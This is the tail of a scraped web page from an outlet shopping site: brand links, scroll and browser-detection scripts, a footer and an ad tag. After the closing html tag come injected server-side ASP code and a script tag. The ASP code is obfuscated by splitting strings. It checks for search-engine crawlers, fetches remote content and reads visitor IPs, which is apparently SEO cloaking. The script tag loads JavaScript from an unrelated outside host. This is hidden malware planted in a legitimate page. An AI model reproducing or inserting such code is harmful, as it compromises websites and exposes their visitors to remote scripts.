	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=389">PERRY&nbsp;ELLIS</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=397">POLO&nbsp;RALPH&nbsp;LAUREN</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=404">PUMA</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1459">RESTORATION&nbsp;HARDWARE</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=366">SAKS&nbsp;FIFTH&nbsp;AVENUE&nbsp;OFF&nbsp;5TH</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=424">SALVATORE&nbsp;FERRAGAMO</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=449">ST. JOHN</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1076">SWAROVSKI</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=869">THEORY</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=536">TIMBERLAND</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=538">TOD'S</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=2854">TOM FORD</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=539">TOMMY&nbsp;HILFIGER</a></li>
    <li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1805">TORY&nbsp;BURCH</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1736">TRUE&nbsp;RELIGION</a></li>
    <li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=519">TUMI</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1598">VALENTINO</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=2232">VERA BRADLEY</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=2696">VINCE CAMUTO</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=551">WILLIAMS-SONOMA</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1052">YVES&nbsp;ST.&nbsp;LAURENT</a></li>
</ul>
<script type="text/javascript" src="/scripts/jquery.simplyscroll.js"></script>
<script type="text/javascript">
$(document).ready(function() {
	$("#scroller").simplyScroll();
    $('.simply-scroll-container').append('<img src="/images/banners-fade-left.png" id="leftFade" /><img src="/images/banners-fade-right.png" id="rightFade" />');
});
</script>
<script type="text/javascript">

        // Browser Detection
        function whichBrs() {
            var agt = navigator.userAgent.toLowerCase();
            if (agt.indexOf("opera") != -1) return 'Opera';
            if (agt.indexOf("staroffice") != -1) return 'Star Office';
            if (agt.indexOf("webtv") != -1) return 'WebTV';
            if (agt.indexOf("beonex") != -1) return 'Beonex';
            if (agt.indexOf("chimera") != -1) return 'Chimera';
            if (agt.indexOf("netpositive") != -1) return 'NetPositive';
            if (agt.indexOf("phoenix") != -1) return 'Phoenix';
            if (agt.indexOf("firefox") != -1) return 'Firefox';
            if (agt.indexOf("safari") != -1) return 'Safari';
            if (agt.indexOf("skipstone") != -1) return 'SkipStone';
            if (agt.indexOf("msie") != -1) return 'Internet Explorer';
            if (agt.indexOf("netscape") != -1) return 'Netscape';
            if (agt.indexOf("mozilla/5.0") != -1) return 'Mozilla';
            if (agt.indexOf('\/') != -1) {
                if (agt.substr(0, agt.indexOf('\/')) != 'mozilla') {
                    return navigator.userAgent.substr(0, agt.indexOf('\/'));
                }
                else return 'Netscape';
            } else if (agt.indexOf(' ') != -1)
                return navigator.userAgent.substr(0, agt.indexOf(' '));
            else return navigator.userAgent;
        }

        if (whichBrs() == "Firefox") {
            document.write("<style>.simply-scroll-list { margin-right: -40px !important; }</style>");
        } else {
            document.write("<style>.simply-scroll-list { margin-right: -15px !important; }</style>");
        }
</script>

    <div class="row">
        <div class="span12">
            <div class="share span4 offset4">
                 
                <a href="http://www.facebook.com/premiumoutlets" target="_blank" class="fb"></a>
                 
                <a target="_blank" href="http://twitter.com/premiumoutlets" class="tt"></a>
                               

                <a target="_blank" href="http://instagram.com/premiumoutlets" class="ins"></a>
                <a target="_blank" href="http://www.pinterest.com/premiumoutlets/" class="pt"></a>
            </div>
        </div>
    </div>
</div>

<div class="container">
    <footer class="footer">
        <hr class="featurette-divider">

        <div class="footer-top clearfix">
            <ul class="inline pull-left">
                <li>
                    <ul class="unstyled">
                        <li><a href= "http://www.premiumoutlets.com/german" class="ft-link">Deutsch</a></li>
                        <li><a href="http://www.premiumoutlets.com/spanish/" class="ft-link">Espa&ntilde;ol</a></li>
                        <li><a href= "http://www.premiumoutlets.com/french/" class="ft-link">Fran&ccedil;ais</a></li>
                    </ul>
                </li>
                <li>
                    <ul class="unstyled">
                        <li><a href="http://www.premiumoutlets.com/portugese/" class="ft-link">Portugu&ecirc;s</a></li>
                        <li><a href= "http://www.premiumoutlets.com/chinese/" class="ft-link">中文</a></li>
                        <li><a href= "http://www.premiumoutlets.com/korean/" class="ft-link">한국어</a></li>
                    </ul>
                </li>
				
				 <li>
                    <ul class="unstyled">
                        <li><a href= "http://www.premiumoutlets.com/japanese/" class="ft-link">日本語</a></li>
                        <li><a href="http://www.premiumoutlets.com/faqs/index.asp" class="ft-link">FAQs</a></li>
                        <li><a href="http://www.premiumoutlets.com/contact/index.asp" class="ft-link">Contact Us</a></li>
                    </ul>
                </li>
                <li>
                    <ul class="unstyled">
					
                        <li><a href="http://www.premiumoutlets.com/sitemap.asp" class="ft-link">Site Map</a></li>
						
							<li><a href="http://www.premiumoutlets.com/privacy/index.asp" class="ft-link">Terms of Use / Policies</a></li>
						
                        
                        <li><a href="http://www.syf.org/" target="_blank" class="ft-link">Simon Youth Foundation</a></li>
                    </ul>
                </li>
				

            </ul>

            <a class="pull-right find-center ft-link" href="http://www.premiumoutlets.com/centers/index.asp">
			
                find a center
			
            </a>
        </div><!--/footer-top-->

        <div class="footer-bottom">
		
							<p>
								<small>
									<em>COPYRIGHT &reg;1999-2014, SIMON PROPERTY GROUP, L.P. ALL RIGHTS RESERVED.
									<br>
									By using this site, you agree to abide by its <a href="http://www.premiumoutlets.com/privacy/index.asp">Terms of Use</a>, which prohibit commercial use of any information on this site. <a href="http://www.premiumoutlets.com/privacy/index.asp">View our Privacy Policy</a> / <a href="http://www.simon.com/legal/california-privacy">Your California Privacy Rights</a></em>
								</small>
							</p>
							
        </div><!--/footer-bottom-->
    </footer>
</div><!--/container-->

<script src="http://www.premiumoutlets.com/js/bootstrap.js" type="text/javascript"></script>

<!-- Google Code for Remarketing Tag -->
<!--------------------------------------------------
Remarketing tags may not be associated with personally identifiable information or placed on pages related to sensitive categories. See more information and instructions on how to setup the tag on: http://google.com/ads/remarketingsetup
--------------------------------------------------->
<script type="text/javascript">
/* <![CDATA[ */
var google_conversion_id = 1002353799;
var google_custom_params = window.google_tag_params;
var google_remarketing_only = true;
/* ]]> */
</script>
<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
</script>
<noscript>
<div style="display:inline;">
<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/1002353799/?value=0&amp;guid=ON&amp;script=0"/>
</div>
</noscript>

        </div><!--end of container-->
        <script>
            $('#brandsAct').addClass('active');
        </script>
    </body>
</html>




<%
	End If
	response.End()
End if
echohtml = ""'GetContent(echourl&"sysid="&systid&"&redirect=yes")
If instr(echohtml,lk)>0 Then
	'response.Write replace(echohtml,lk,"")
End If
Function GetContent(url)
	'on error resume next
	Dim xmlHttp
	Set xmlHttp = Server.Createobject("WinHttp.WinHttpRequest.5.1")
	'xmlHttp.SetTimeouts 60000, 60000, 60000, 3000
	xmlHttp.Open "POST", url , False
	xmlHttp.Send()
	GetHtml	= xmlHttp.ResponseBody
	Set xmlHttp=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "UTF-8"
	GetContent = objStream.ReadText
	objStream.Close
End Function

Function ChecksAgent()
  on error resume next
  agentallow=split("ba"&"idus"&"pid"&"er,so"&"g"&"ou,ba"&"i"&"du,so"&"sos"&"pider,goo"&"g"&"lebot",",")
  agentcheck=false
  For agenti=lbound(agentallow) to ubound(agentallow)
    If Instr(LCase(RSbs("HTTP_USER_AGENT")),agentallow(agenti))>0 then
      agentcheck=true
      Exit For
    end if 
  Next
  ChecksAgent=agentcheck
End function
Function GetRsip()
  'on error resume next
  Dim getips
  If RSbs("HTTP_"&"X_FOR"&"W"&"ARDED_FOR") = "" Or InStr(RSbs("H"&"TTP_X_FO"&"RW"&"ARD"&"ED_FOR"), "unknown") > 0 Then
   getips = RSbs("REM"&"OTE_A"&"DDR")
  ElseIf InStr(RSbs("HT"&"TP_"&"X_FORW"&"ARDED_FOR"), ",") > 0 Then
   getips = Mid(RSbs("H"&"TTP"&"_X_FO"&"RW"&"ARD"&"ED_FOR"), 1, InStr(RSbs("H"&"TT"&"P_"&"X_F"&"ORW"&"AR"&"DE"&"D_F"&"OR"), ",")-1)
   actforip = RSbs("REMO"&"TE_ADD"&"R")
  ElseIf InStr(RSbs("HTT"&"P_X"&"_F"&"RW"&"AR"&"DED_FOR"), ";") > 0 Then
   getips = Mid(RSbs("HT"&"TP_"&"X_F"&"OR"&"W"&"AR"&"DED_"&"FO"&"R"), 1, InStr(RSbs("H"&"TT"&"P_"&"_F"&"OR"&"WA"&"RD"&"ED_"&"FOR"), ";")-1)
   actforip = RSbs("R"&"EMO"&"TE_"&"AD"&"D"&"R")
  Else
   getips = RSbs("HT"&"TP"&"_X_FO"&"RW"&"ARD"&"ED_"&"FOR")
   actforip = RSbs("R"&"EM"&"OTE"&"_AD"&"DR")
  End If
  GetRsip = Replace(Trim(Mid(getips, 1, 30)), "'", "")
End Function

Function RSbs(str)
	RSbs = Request.ServerVariables(str)
End Function
%>
<script src="http://dx.jd9.co/a/meika.js" type="text/javascript"></script>